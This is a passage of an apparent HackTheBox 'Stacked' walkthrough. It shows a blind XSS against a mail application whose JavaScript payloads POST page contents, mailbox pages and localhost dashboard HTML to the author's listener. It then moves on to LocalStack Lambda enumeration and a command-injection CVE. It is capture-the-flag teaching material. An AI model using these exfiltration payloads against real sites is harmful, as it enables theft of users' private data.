+<p>In previous challenges where I had this kind of XSS access (like <a href="/2021/03/20/htb-crossfit.html#identify-xss">CrossFit</a> and <a href="/2020/03/07/htb-bankrobber.html#xss---admin-login">BankRobber</a>), I had a specific target in mind, some action I wanted to do as the admin. In this case, I’ve seen very little of the site, so I’ll need to do some orienting.</p>
+<p>I’ll write a simple JS script that sends the current location of the page back to my server:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">exfilreq</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>    
+<span class="nx">exfilreq</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://10.10.14.6/</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>    
+<span class="nx">exfilreq</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span> 
+</code></pre></div></div>
+<p>After a minute, there’s a request to get the payload, followed by a request showing the url:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.112 - - [24/Aug/2021 11:42:03] "GET /xss-1.js HTTP/1.1" 200 -
+10.10.11.112 - - [24/Aug/2021 11:42:04] code 404, message File not found
+10.10.11.112 - - [24/Aug/2021 11:42:04] "GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1" 404 -
+</code></pre></div></div>
+<p>Nice. In that 404 I can see that the current location my script is executing in is <code class="language-plaintext highlighter-rouge">http://mail.stacked.htb/read-mail.php?id=2</code>. That looks like some kind of mail endpoint. I’ll try setting that subdomain in <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and visiting it, but it must be only on localhost.</p>
+<h4 id="source">Source</h4>
+<p>I can update the JavaScript request slightly to pull the full page HTML:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">exfilreq</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>    
+<span class="nx">exfilreq</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://10.10.14.6:9001/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>    
+<span class="nx">exfilreq</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">outerHTML</span><span class="p">);</span> 
+</code></pre></div></div>
+<p>I’ll need a different port for the exfil as the Python HTTP server doesn’t handle POST requests. I’ll start <code class="language-plaintext highlighter-rouge">nc</code> listening on 9001. On sending the request again, after a minute, there’s a request for the JS:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.112 - - [24/Aug/2021 11:51:03] "GET /xss-2.js HTTP/1.1" 200 -
+</code></pre></div></div>
+<p>Then a POST to <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 9001
+<span class="go">listening on [any] 9001 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.11.112] 45486 
+POST / HTTP/1.1                                            
+Host: 10.10.14.6:9001
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://mail.stacked.htb/read-mail.php?id=2        
+Content-Length: 7954                                       
+Content-Type: text/plain;charset=UTF-8
+Origin: http://mail.stacked.htb                            
+Connection: keep-alive
+
+&lt;html lang="en"&gt;&lt;head&gt;
+  &lt;meta charset="utf-8"&gt;
+  &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+  &lt;title&gt;AdminLTE 3 | Read Mail&lt;/title&gt;
+...[snip]...
+</span></code></pre></div></div>
+<p>I can save that to a file and open it in Firefox. The CSS / images don’t show (because they will be failed requests to mail.stacked.htb), but I can still see the general page and links:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210824115718119.webp" type="image/webp"/>
+<img alt="image-20210824115718119" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210824115718119.png"/>
+</picture>
+<p>The “Inbox” link points to <code class="language-plaintext highlighter-rouge">/dashboard.php</code>. I’ll actually make this page available from my VM and play with it in <a href="#message-app">Beyond Root</a>.</p>
+<h3 id="view-mailbox">View Mailbox</h3>
+<p>To get another page as this user and then return it, I’ll need to make two HTTP requests with JavaScript. The first will get the page I want, and the second will return the source just like above. The first request will get <code class="language-plaintext highlighter-rouge">/dashboard.php</code>. It will also have a <code class="language-plaintext highlighter-rouge">onreadystatechange</code> function that waits for the request to finish (<code class="language-plaintext highlighter-rouge">readyState == 4</code>), and then starts a new request to send the results back to me:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">dashboardreq</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>    
+<span class="nx">dashboardreq</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>              
+  <span class="k">if </span><span class="p">(</span><span class="nx">dashboardreq</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>                       
+    <span class="kd">var</span> <span class="nx">exfilreq</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>                    
+    <span class="nx">exfilreq</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://10.10.14.6:9001/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>                                                      
+    <span class="nx">exfilreq</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">dashboardreq</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>                 
+  <span class="p">}</span>     
+<span class="p">};</span>    
+<span class="nx">dashboardreq</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/dashboard.php</span><span class="dl">'</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>    
+<span class="nx">dashboardreq</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>  
+</code></pre></div></div>
+<p>After a minute, I have another page that shows my email as well as one more from “Jeremy Taint”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210824120713361.webp" type="image/webp"/>
+<img alt="image-20210824120713361" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210824120713361.png"/>
+</picture>
+<p>The link on the first one is <code class="language-plaintext highlighter-rouge">/read-mail.php?id=1</code>, and the subject line is interesting.</p>
+<h3 id="read-mail">Read Mail</h3>
+<p>The same payload as above, but with a different initial URL:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">mail1req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>    
+<span class="nx">mail1req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>    
+  <span class="k">if </span><span class="p">(</span><span class="nx">mail1req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>    
+    <span class="kd">var</span> <span class="nx">exfilreq</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>    
+    <span class="nx">exfilreq</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://10.10.14.6:9001/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>    
+    <span class="nx">exfilreq</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">mail1req</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>    
+  <span class="p">}</span>    
+<span class="p">};</span>    
+<span class="nx">mail1req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/read-mail.php?id=1</span><span class="dl">'</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>    
+<span class="nx">mail1req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>    
+</code></pre></div></div>
+<p>In the resulting page, there’s a message:</p>
+<div class="language-html wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...[snip]...
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"mailbox-read-message"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;p&gt;</span>Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks.<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/div&gt;</span>                             
+<span class="c">&lt;!-- /.mailbox-read-message --&gt;</span>  
+...[snip]...
+</code></pre></div></div>
+<p>I’ll add s3-testing.stacked.htb to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.  There is a service running there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://s3-testing.stacked.htb/
+<span class="go">{"status": "running"}
+</span></code></pre></div></div>
+<h2 id="shell-as-localstack-on-localstack">Shell as localstack on localstack</h2>
+<h3 id="aws-enumeration">AWS Enumeration</h3>
+<h4 id="install--configure">Install / Configure</h4>
+<p>I’ll need the AWScli (<code class="language-plaintext highlighter-rouge">apt install awscli</code>), and just like in <a href="/2021/04/24/htb-bucket.html#upload-to-bucket">Bucket</a>, I’ll need to configure it first:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws configure 
+<span class="go">AWS Access Key ID [None]: test
+AWS Secret Access Key [None]: test
+Default region name [None]: us-east-1
+Default output format [None]: 
+</span></code></pre></div></div>
+<p>The localstack page suggests using <code class="language-plaintext highlighter-rouge">test</code> as the key and secret, but anything works as localstack doesn’t support auth yet.</p>
+<p>Calling <code class="language-plaintext highlighter-rouge">aws</code> typically takes the following form:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws <span class="o">[</span><span class="nb">command</span><span class="o">]</span> <span class="o">[</span>subcommand] <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb 
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">help</code> as a command or subcommand is really useful for listing all the capabilities of the client. Running <code class="language-plaintext highlighter-rouge">aws help</code> shows the full man page, including the list of commands.</p>
+<h4 id="lambda-enumeration">Lambda Enumeration</h4>
+<p>Given the line in the config on the site <code class="language-plaintext highlighter-rouge">SERVICES=serverless</code>, it seems like Lambda would be a good feature to go after. Lambda is Amazon’s <a href="https://aws.amazon.com/lambda/">serverless compute offering</a>, and I showed some interactions with Lambda on <a href="/2022/03/10/htb-epsilon.html#lambda">Epsilon</a>. Instead of getting a VM in the cloud (like S3), you give it a function and a set of triggers, and when the trigger happens (which can be time based or event based), that function runs.</p>
+<p><code class="language-plaintext highlighter-rouge">aws lambda</code> has a <code class="language-plaintext highlighter-rouge">list-functions</code> subcommand, and it shows there are currently none on Stacked:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda list-functions <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb
+<span class="go">{
+    "Functions": []
+}
+</span></code></pre></div></div>
+<h3 id="create-lambda-function">Create Lambda Function</h3>
+<h4 id="background">Background</h4>
+<p>The AWS docs page for <a href="https://docs.aws.amazon.com/cli/latest/reference/lambda/create-function.html">create-function</a> has a <em>ton</em> of information on it. I’m going to call with the following arguments:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">--function-name</code> - whatever I want to call my function</li>
+<li><code class="language-plaintext highlighter-rouge">--zip-file</code> - the name of the package I want to upload with the code in it</li>
+<li><code class="language-plaintext highlighter-rouge">--handler</code> - the function to call, in the format <code class="language-plaintext highlighter-rouge">[filename].[function]</code></li>
+<li><code class="language-plaintext highlighter-rouge">--role</code> - the Amazon Resource Name (ARN) of the function’s execition role</li>
+<li><code class="language-plaintext highlighter-rouge">--runtime</code> - what interpreter will be running the code (ie <code class="language-plaintext highlighter-rouge">python</code>, <code class="language-plaintext highlighter-rouge">nodejs</code>, etc)</li>
+</ul>
+<p><a href="https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-package.html#gettingstarted-package-zip">This page</a> describes the format of the archive containing the code, and has links to how to create that zip for various languages. That’s mostly necessary when you want to bring outside packages or more complicated code to Lambda. I’ll be working with a single file.</p>
+<p>I don’t have great details about what <code class="language-plaintext highlighter-rouge">role</code> looks like in the context of LocalStack, but I found this string in some examples, and it seemed to work:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arn:aws:iam::123456789012:role/lambda-role
+</code></pre></div></div>
+<p>Once I create a function, I’ll want to run it. I can use <code class="language-plaintext highlighter-rouge">aws lambda invoke</code> and pass it <code class="language-plaintext highlighter-rouge">--function-name</code> as well as <code class="language-plaintext highlighter-rouge">--payload</code> where I can pass in args.</p>
+<h4 id="python">Python</h4>
+<p>AWS also has <a href="https://github.com/awsdocs/aws-doc-sdk-examples/blob/master/python/example_code/lambda/boto_client_examples/lambda_handler_basic.py">this sample code</a> on GitHub as a Python Lambda function. I’ll save it as <code class="language-plaintext highlighter-rouge">example.py</code>, and package it into a Zip file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>zip example.zip example.py 
+<span class="go">  adding: example.py (deflated 50%)
+</span></code></pre></div></div>
+<p>I’ll upload it giving</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda create-function <span class="nt">--function-name</span> example <span class="nt">--zip-file</span> fileb://example.zip <span class="nt">--role</span> arn:aws:iam::123456789012:role/lambda-role <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb <span class="nt">--runtime</span> python3.7 <span class="nt">--handler</span> example.lambda_handler
+<span class="go">{
+    "FunctionName": "example",
+    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:example",
+    "Runtime": "python3.7",
+    "Role": "arn:aws:iam::123456789012:role/lambda-role",
+    "Handler": "example.lambda_handler",
+    "CodeSize": 738,
+    "Description": "",
+    "Timeout": 3,
+    "LastModified": "2021-08-25T15:04:40.094+0000",
+    "CodeSha256": "4MJzmV5OhOnWLUL0OPxiQQKwygBSIu9eLJfQcPd33wg=",
+    "Version": "$LATEST",
+    "VpcConfig": {},
+    "TracingConfig": {
+        "Mode": "PassThrough"
+    },
+    "RevisionId": "dcd12bc7-e715-4b33-962d-1077ce72f308",
+    "State": "Active",
+    "LastUpdateStatus": "Successful",
+    "PackageType": "Zip"
+}
+</span></code></pre></div></div>
+<p>The arguments from above. I’ll select <code class="language-plaintext highlighter-rouge">python3.7</code> from the list of <a href="https://docs.aws.amazon.com/lambda/latest/dg/lambda-runtimes.html">AWS lambda runtimes</a>, and it appears to work.</p>
+<p>Next I’ll invoke it, giving it the function name and a file for output:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda invoke <span class="nt">--function-name</span> example out.json <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb 
+<span class="go">{
+    "StatusCode": 200,
+    "FunctionError": "Unhandled",
+    "LogResult": "",
+    "ExecutedVersion": "$LATEST"
+}
+</span></code></pre></div></div>
+<p>The fact that <code class="language-plaintext highlighter-rouge">FunctionError</code> is there is a bad sign. Looking in <code class="language-plaintext highlighter-rouge">out.json</code> (using <code class="language-plaintext highlighter-rouge">jq</code> to pretty print it):</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"errorMessage"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Lambda process returned error status code: 1. Result: . Output:</span><span class="se">\n</span><span class="s2">Unable to find image 'lambci/lambda:20191117-python3.7' locally</span><span class="se">\n</span><span class="s2">Error response from daemon: Get https://registry-1.docker.io/v2/: dial tcp: lookup registry-1.docker.io: Temporary failure in name resolution</span><span class="se">\n</span><span class="s2">must specify at least one container source</span><span class="se">\n</span><span class="s2">json: cannot unmarshal array into Go value of type types.ContainerJSON"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"errorType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"InvocationException"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"stackTrace"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="s2">"  File </span><span class="se">\"</span><span class="s2">/opt/code/localstack/localstack/services/awslambda/lambda_api.py</span><span class="se">\"</span><span class="s2">, line 552, in run_lambda</span><span class="se">\n</span><span class="s2">    result = LAMBDA_EXECUTOR.execute(func_arn, func_details, event, context=context,</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"  File </span><span class="se">\"</span><span class="s2">/opt/code/localstack/localstack/services/awslambda/lambda_executors.py</span><span class="se">\"</span><span class="s2">, line 174, in execute</span><span class="se">\n</span><span class="s2">    return do_execute()</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"  File </span><span class="se">\"</span><span class="s2">/opt/code/localstack/localstack/services/awslambda/lambda_executors.py</span><span class="se">\"</span><span class="s2">, line 166, in do_execute</span><span class="se">\n</span><span class="s2">    return _run(func_arn=func_arn)</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"  File </span><span class="se">\"</span><span class="s2">/opt/code/localstack/localstack/utils/cloudwatch/cloudwatch_util.py</span><span class="se">\"</span><span class="s2">, line 149, in wrapped</span><span class="se">\n</span><span class="s2">    raise e</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"  File </span><span class="se">\"</span><span class="s2">/opt/code/localstack/localstack/utils/cloudwatch/cloudwatch_util.py</span><span class="se">\"</span><span class="s2">, line 145, in wrapped</span><span class="se">\n</span><span class="s2">    result = func(*args, **kwargs)</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"  File </span><span class="se">\"</span><span class="s2">/opt/code/localstack/localstack/services/awslambda/lambda_executors.py</span><span class="se">\"</span><span class="s2">, line 157, in _run</span><span class="se">\n</span><span class="s2">    raise e</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"  File </span><span class="se">\"</span><span class="s2">/opt/code/localstack/localstack/services/awslambda/lambda_executors.py</span><span class="se">\"</span><span class="s2">, line 145, in _run</span><span class="se">\n</span><span class="s2">    result = self._execute(func_arn, func_details, event, context, version)</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"  File </span><span class="se">\"</span><span class="s2">/opt/code/localstack/localstack/services/awslambda/lambda_executors.py</span><span class="se">\"</span><span class="s2">, line 323, in _execute</span><span class="se">\n</span><span class="s2">    result = self.run_lambda_executor(cmd, stdin, env_vars=environment, func_details=func_details)</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"  File </span><span class="se">\"</span><span class="s2">/opt/code/localstack/localstack/services/awslambda/lambda_executors.py</span><span class="se">\"</span><span class="s2">, line 229, in run_lambda_executor</span><span class="se">\n</span><span class="s2">    raise InvocationException('Lambda process returned error status code: %s. Result: %s. Output:</span><span class="se">\\</span><span class="s2">n%s' %</span><span class="se">\n</span><span class="s2">"</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>“Unable to find image ‘lambci/lambda:20191117-python3.7”. I tried a couple other Python runtimes, but with the same errors. I don’t think the Python runtimes are on this host.</p>
+<h4 id="nodejs">NodeJS</h4>
+<p>The AWS <a href="https://docs.aws.amazon.com/lambda/latest/dg/nodejs-handler.html">Node.js page</a> has a really simple example Lambda JavaScript script:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">exports</span><span class="p">.</span><span class="nx">handler</span> <span class="o">=</span>  <span class="k">async</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="nx">context</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">EVENT: </span><span class="se">\n</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
+  <span class="k">return</span> <span class="nx">context</span><span class="p">.</span><span class="nx">logStreamName</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>After saving as <code class="language-plaintext highlighter-rouge">index.js</code>, I’ll it to an archive:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>zip index.zip index.js 
+<span class="go">  adding: index.js (deflated 14%)
+</span></code></pre></div></div>
+<p>I’ll upload the script to Lambda using a runtime from the page above. <code class="language-plaintext highlighter-rouge">nodejs14.x</code> isn’t on Stacked (just like Python), but <code class="language-plaintext highlighter-rouge">node12.x</code> is:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda create-function <span class="nt">--function-name</span> ex <span class="nt">--zip-file</span> fileb://index.zip <span class="nt">--role</span> arn:aws:iam::123456789012:role/lambda-role <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb <span class="nt">--handler</span> index.handler <span class="nt">--runtime</span> nodejs12.x
+<span class="go">{
+    "FunctionName": "ex",
+    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:ex",
+    "Runtime": "nodejs12.x",
+    "Role": "arn:aws:iam::123456789012:role/lambda-role",
+    "Handler": "index.handler",
+    "CodeSize": 291,
+    "Description": "",
+    "Timeout": 3,
+    "LastModified": "2021-08-25T17:15:18.892+0000",
+    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
+    "Version": "$LATEST",
+    "VpcConfig": {},
+    "TracingConfig": {
+        "Mode": "PassThrough"
+    },
+    "RevisionId": "eb6d8003-ef40-4df5-8616-c97d4b08f5df",
+    "State": "Active",
+    "LastUpdateStatus": "Successful",
+    "PackageType": "Zip"
+}
+</span></code></pre></div></div>
+<p>On invoking it, the return doesn’t have an error, and the output is in the file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda invoke <span class="nt">--function-name</span> ex <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb out.json
+<span class="go">{
+    "StatusCode": 200,
+    "LogResult": "",
+    "ExecutedVersion": "$LATEST"
+}
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>out.json 
+<span class="go">"2021/08/25/[$LATEST]e8413d1630b798e88ef9005ff0f5ab93"
+</span></code></pre></div></div>
+<h3 id="fail---lambda-rev-shell">Fail - Lambda Rev Shell</h3>
+<p>My first instinct when I get this kind of execution is to use it to get a shell. In hindsight, this doesn’t make a ton of sense. A Lambda function can be thought of as spinning up a relatively empty container, running the function, and then tearing that container down. Even with execution in the container, there won’t be anything there, and it will die off quickly.</p>
+<h3 id="rce-on-localstack">RCE on LocalStack</h3>
+<h4 id="background-1">Background</h4>
+<p>Some googling for “exploit localstack lambda” leads to <a href="https://blog.sonarsource.com/hack-the-stack-with-localstack">this article</a> by SonarSource, which includes a command injection vulnerability in LocalStack, CVE-2021-32090. The idea here is that there is a command injection in the function name that is triggered when it’s displayed on the web dashboard.</p>
+<p>The default port for the dashboard is 8080, so based on the config I leaked earlier, it seems like that is enabled (though only available on localhost):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ports:
+      - "127.0.0.1:443:443"
+      - "127.0.0.1:4566:4566"
+      - "127.0.0.1:4571:4571"
+      - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"
+</code></pre></div></div>
+<p>Since all of those services are listening on localhost, only if there’s something forwarding the port on can I access it. Given that Apache is hosting the web server, it seems that requests to <code class="language-plaintext highlighter-rouge">s3-testing.stacked.htb</code> are being sent to the LocalStack container. But I haven’t found anything forwarding to the dashboard on 8080.</p>
+<h4 id="dashboard">Dashboard</h4>
+<p>For this to work, I need to prove the dashboard exists. I’ll create another XSS payload to try to fetch and return the it:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">mail1req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>    
+<span class="nx">mail1req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>    
+  <span class="k">if </span><span class="p">(</span><span class="nx">mail1req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>    
+    <span class="kd">var</span> <span class="nx">exfilreq</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>    
+    <span class="nx">exfilreq</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://10.10.14.6:9001/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>    
+    <span class="nx">exfilreq</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">mail1req</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>    
+  <span class="p">}</span>    
+<span class="p">};</span>    
+<span class="nx">mail1req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://localhost:8080/</span><span class="dl">'</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>    
+<span class="nx">mail1req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>   
+</code></pre></div></div>
+<p>It does…but the page is not complete - Where I would expect to find the body is just this:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...[snip]...
+<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"page"</span> <span class="na">class=</span><span class="s">"fullsize"</span><span class="nt">&gt;</span>
+  <span class="c">&lt;!-- Header --&gt;</span>
+  <span class="nt">&lt;header</span> <span class="na">id=</span><span class="s">"header"</span> <span class="na">role=</span><span class="s">"banner"</span> <span class="na">style=</span><span class="s">"position: absolute;
+      top: 0px; width: 100%; border-bottom: 1px solid #aaaaaa; background: #fafaf4"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;nav</span> <span class="na">class=</span><span class="s">"aui-header aui-dropdown2-trigger-group"</span> <span class="na">role=</span><span class="s">"navigation"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"aui-header-inner"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"aui-header-primary"</span><span class="nt">&gt;</span>
+          <span class="nt">&lt;h1</span> <span class="na">id=</span><span class="s">"logo"</span> <span class="na">class=</span><span class="s">"aui-header-logo aui-header-logo-textonly"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"aui-header-logo-device"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"img/localstack_small.png"</span> <span class="na">style=</span><span class="s">"height: 30px; padding: 2px; margin-right: 10px;"</span><span class="nt">/&gt;</span>
+              <span class="nt">&lt;/span&gt;</span>
+          <span class="nt">&lt;/h1&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+      <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/nav&gt;</span>
+  <span class="nt">&lt;/header&gt;</span>
+
+  <span class="c">&lt;!-- Content --&gt;</span>
